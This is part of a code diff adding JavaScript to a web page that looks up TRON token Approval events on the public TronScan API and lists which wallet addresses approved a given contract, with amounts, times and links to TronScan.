+                    });
+                    
+                    html += `</ul>`;
+                    allowanceResultDiv.innerHTML += html;
+                  } else {
+                    // 处理授权记录
+                    // 这部分代码可以参考原本的代码
+                  }
+                } else {
+                  allowanceResultDiv.innerHTML += "<p>备用API未找到授权记录</p>";
+                }
+              } catch (backupError) {
+                console.error("备用API查询失败:", backupError);
+                allowanceResultDiv.innerHTML += `<p style="color:red">备用API也查询失败: ${backupError.message}</p>`;
+              }
+            }
+          }
+        } catch (error) {
+          // 最终错误处理
+          console.error("查询TRON授权历史失败:", error);
+          allowanceResultDiv.innerHTML = `<p style="color:red">查询TRON授权历史失败: ${error.message}</p>`;
+          allowanceResultDiv.innerHTML += `
+            <p>您可以直接在<a href="https://tronscan.org/#/address/${tronAccount}" target="_blank">TronScan</a>上查看您的所有交易</p>
+          `;
+        }
+      } else {
+        allowanceResultDiv.innerText = "未检测到支持的网络环境";
+      }
+    });
+    
+    // 查询合约被哪些钱包授权的功能
+    document.getElementById('checkContractAuthBtn').addEventListener('click', async function() {
+      const contractAuthResultDiv = document.getElementById('contractAuthResult');
+      const contractToCheck = document.getElementById('contractToCheck').value.trim();
+      
+      if (!contractToCheck) {
+        contractAuthResultDiv.innerText = "请输入要查询的合约地址";
+        return;
+      }
+      
+      contractAuthResultDiv.innerHTML = "<p>正在查询合约授权情况...</p>";
+      
+      if (detectedNetworkType === 'tron') {
+        try {
+          // 使用TronScan API查询该合约的授权情况
+          contractAuthResultDiv.innerHTML += "<p>正在通过TronScan API查询数据...</p>";
+          
+          const tokenAddress = document.getElementById('tokenAddress').value.trim();
+          if (!tokenAddress) {
+            contractAuthResultDiv.innerHTML += "<p>请在上方填写Token合约地址</p>";
+            return;
+          }
+          
+          // 调用TronScan API查询Approval事件，spender为指定合约
+          const apiUrl = `https://apilist.tronscan.org/api/contract/events?contract=${tokenAddress}&event_name=Approval&limit=200`;
+          
+          const response = await fetch(apiUrl);
+          const data = await response.json();
+          
+          console.log("合约授权查询返回数据:", data);
+          
+          if (data && data.data && data.data.length > 0) {
+            // 检查是否是转账记录而非授权记录
+            const isTransferEvent = data.data[0] && 
+                                   (data.data[0].transferFromAddress || 
+                                    data.data[0].transferToAddress);
+            
+            if (isTransferEvent) {
+              // 显示错误信息
+              contractAuthResultDiv.innerHTML = `<p style="color:orange">API返回的是转账记录而非授权记录，无法完成查询</p>`;
+              contractAuthResultDiv.innerHTML += `<p>您可以尝试在
+                <a href="https://tronscan.org/#/contract/${tokenAddress}/transactions" target="_blank">TronScan</a>
+                上查看合约的所有交易记录</p>`;
+              return;
+            }
+            
+            // 过滤出spender是指定合约地址的授权事件
+            let matchedEvents = [];
+            let tronWebToUse = window.tronWeb || customTronWeb;
+            
+            // 尝试将输入的合约地址标准化
+            let normalizedContractAddress;
+            try {
+              if (contractToCheck.startsWith('T')) {
+                // 如果是base58地址，转换为hex
+                normalizedContractAddress = tronWebToUse.address.toHex(contractToCheck);
+              } else if (contractToCheck.startsWith('41')) {
+                // 已经是hex地址
+                normalizedContractAddress = contractToCheck;
+              } else if (contractToCheck.startsWith('0x')) {
+                // 如果是0x开头，去掉0x，加上41
+                normalizedContractAddress = '41' + contractToCheck.slice(2);
+              } else {
+                normalizedContractAddress = contractToCheck;
+              }
+            } catch (e) {
+              normalizedContractAddress = contractToCheck;
+              console.log("地址转换错误:", e);
+            }
+            
+            console.log("标准化后的查询地址:", normalizedContractAddress);
+            
+            // 过滤并提取事件中的信息
+            for (const event of data.data) {
+              try {
+                let spenderAddress = null;
+                let ownerAddress = null;
+                let amount = "未知额度";
+                
+                // 首先尝试从result中获取spender地址
+                if (event.result) {
+                  // 尝试各种可能的命名方式
+                  if (event.result.spender) {
+                    spenderAddress = event.result.spender;
+                  } else if (event.result._spender) {
+                    spenderAddress = event.result._spender;
+                  }
+                  
+                  // 获取所有者地址
+                  if (event.result.owner) {
+                    ownerAddress = event.result.owner;
+                  } else if (event.result._owner) {
+                    ownerAddress = event.result._owner;
+                  }
+                  
+                  // 获取授权额度
+                  amount = event.result.value || event.result._value || event.result.amount || "0";
+                }
+                
+                // 如果在result中没找到，尝试在其他地方找
+                if (!spenderAddress && event.spender) {
+                  spenderAddress = event.spender;
+                }
+                if (!ownerAddress && event.owner) {
+                  ownerAddress = event.owner;
+                }
+                
+                // 地址可能是hex格式，尝试转换
+                try {
+                  if (spenderAddress && (spenderAddress.startsWith('41') || spenderAddress.startsWith('0x'))) {
+                    let hexAddress = spenderAddress;
+                    if (spenderAddress.startsWith('0x')) {
+                      hexAddress = '41' + spenderAddress.slice(2);
+                    }
+                    spenderAddress = hexAddress;
+                  }
+                } catch (e) { console.error("地址转换错误:", e); }
+                
+                // 检查spender是否匹配我们要查询的合约地址
+                if (spenderAddress && 
+                    (spenderAddress.toLowerCase() === normalizedContractAddress.toLowerCase() ||
+                     spenderAddress === contractToCheck)) {
+                  
+                  // 将owner地址转换为易读格式
+                  let readableOwnerAddress = ownerAddress;
+                  try {
+                    if (ownerAddress && (ownerAddress.startsWith('41') || ownerAddress.startsWith('0x'))) {
+                      let hexOwner = ownerAddress;
+                      if (ownerAddress.startsWith('0x')) {
+                        hexOwner = '41' + ownerAddress.slice(2);
+                      }
+                      readableOwnerAddress = tronWebToUse.address.fromHex(hexOwner);
+                    }
+                  } catch (e) { console.error("地址转换错误:", e); }
+                  
+                  // 将额度格式化为易读格式
+                  let readableAmount = amount;
+                  try {
+                    if (amount && !isNaN(amount)) {
+                      const numValue = BigInt(amount);
+                      if (numValue > 1000000) {
+                        if (numValue >= 1000000000000) {
+                          const formatted = (Number(numValue) / 1000000000000).toFixed(2) + "T";
+                          readableAmount = `${amount} (${formatted})`;
+                        } else if (numValue >= 1000000000) {
+                          const formatted = (Number(numValue) / 1000000000).toFixed(2) + "B";
+                          readableAmount = `${amount} (${formatted})`;
+                        } else {
+                          const formatted = (Number(numValue) / 1000000).toFixed(2) + "M";
+                          readableAmount = `${amount} (${formatted})`;
+                        }
+                      }
+                    }
+                  } catch (e) { console.error("金额格式化错误:", e); }
+                  
+                  // 提取并格式化时间戳
+                  let timestamp = event.block_timestamp || event.timestamp;
+                  let readableTime = "未知时间";
+                  if (timestamp) {
+                    // 检查时间戳是毫秒还是秒
+                    if (timestamp < 10000000000) {
+                      // 如果是秒级时间戳，转换为毫秒
+                      timestamp = timestamp * 1000;
+                    }
+                    readableTime = new Date(timestamp).toLocaleString();
+                  }
+                  
+                  matchedEvents.push({
+                    owner: readableOwnerAddress,
+                    amount: readableAmount,
+                    time: readableTime,
+                    block: event.block || event.blockNumber || "未知区块"
+                  });
+                }
+              } catch (eventError) {
+                console.error("处理事件数据失败:", eventError);
+              }
+            }
+            
+            // 显示匹配的授权事件
+            if (matchedEvents.length > 0) {
+              let html = `<p style="font-weight:bold">找到 ${matchedEvents.length} 个对合约 <span style="color:blue">${contractToCheck}</span> 的授权记录:</p>`;
+              
+              // 添加调试按钮以查看原始数据
+              const rawDataId = 'rawContractData_' + Date.now();
+              html += `<button onclick="document.getElementById('${rawDataId}').style.display = document.getElementById('${rawDataId}').style.display === 'none' ? 'block' : 'none';" style="margin: 10px 0; padding: 5px 10px;">显示/隐藏原始数据</button>
+                      <div id="${rawDataId}" style="display: none; max-height: 200px; overflow: auto; background: #f5f5f5; padding: 10px; margin-bottom: 10px; font-size: 12px; white-space: pre-wrap; font-family: monospace;">
+                      ${JSON.stringify(data.data, null, 2)}
+                      </div>`;
+              
+              html += `<ul style="list-style: none; padding: 0;">`;
+              matchedEvents.forEach((event, index) => {
+                html += `
+                  <li style="border-bottom: 1px dashed #ddd; padding: 8px 0; margin-bottom: 5px;">
+                    <div><span style="color:#666; display: inline-block; width: 70px;">授权方:</span> <strong>${event.owner}</strong></div>
+                    <div><span style="color:#666; display: inline-block; width: 70px;">授权额度:</span> <strong>${event.amount}</strong></div>
+                    <div><span style="color:#666; display: inline-block; width: 70px;">时间:</span> ${event.time}</div>
+                    <div><span style="color:#666; display: inline-block; width: 70px;">区块:</span> ${event.block}</div>
+                  </li>
+                `;
+              });
+              html += `</ul>`;
+              
+              html += `<p><a href="https://tronscan.org/#/address/${contractToCheck}/transactions" target="_blank">在TronScan上查看更多交易记录</a></p>`;
+              
+              contractAuthResultDiv.innerHTML = html;
+            } else {
+              contractAuthResultDiv.innerHTML = `<p>未找到对合约 <strong>${contractToCheck}</strong> 的授权记录</p>`;
+              contractAuthResultDiv.innerHTML += `<p>可能的原因：</p>
+                <ul>
+                  <li>该合约地址未被任何钱包授权</li>
+                  <li>合约地址格式错误</li>
+                  <li>API限制导致无法获取完整数据</li>
+                </ul>
+                <p>您可以在<a href="https://tronscan.org/#/address/${contractToCheck}/transactions" target="_blank">TronScan</a>上查看该地址的交易记录</p>`;
+            }
+          } else {
+            contractAuthResultDiv.innerHTML = "<p>API未返回任何授权数据</p>";
+            contractAuthResultDiv.innerHTML += `<p>您可以在<a href="https://tronscan.org/#/address/${contractToCheck}/transactions" target="_blank">TronScan</a>上查看该地址的交易记录</p>`;
+          }
+        } catch (error) {
+          console.error("查询合约授权失败:", error);
+          contractAuthResultDiv.innerHTML = `<p style="color:red">查询失败: ${error.message}</p>`;
+          contractAuthResultDiv.innerHTML += `<p>您可以在<a href="https://tronscan.org/#/address/${contractToCheck}/transactions" target="_blank">TronScan</a>上查看该地址的交易记录</p>`;
+        }
+      } else if (detectedNetworkType === 'evm') {
+        // EVM网络合约授权查询
+        contractAuthResultDiv.innerHTML = `<p>EVM网络暂不支持该功能。您可以通过区块浏览器查看合约交易记录。</p>`;
+      } else {
+        contractAuthResultDiv.innerText = "未检测到支持的网络环境";
+      }
+    });
+    
+    // 复制Token地址按钮
+    document.getElementById('copyTokenBtn').addEventListener('click', function() {
+      const tokenAddress = document.getElementById('tokenAddress').value.trim();
+      const contractInput = document.getElementById('contractToCheck');
+      
+      if (tokenAddress) {
+        contractInput.value = tokenAddress;
+        // 闪烁效果提示复制成功
+        contractInput.style.backgroundColor = '#d1f8cb';
+        setTimeout(() => {
+          contractInput.style.backgroundColor = '';
+        }, 1000);
+      } else {
+        alert('请先在上方输入Token合约地址');
+      }
+    });
   </script>
 </body>
 </html>
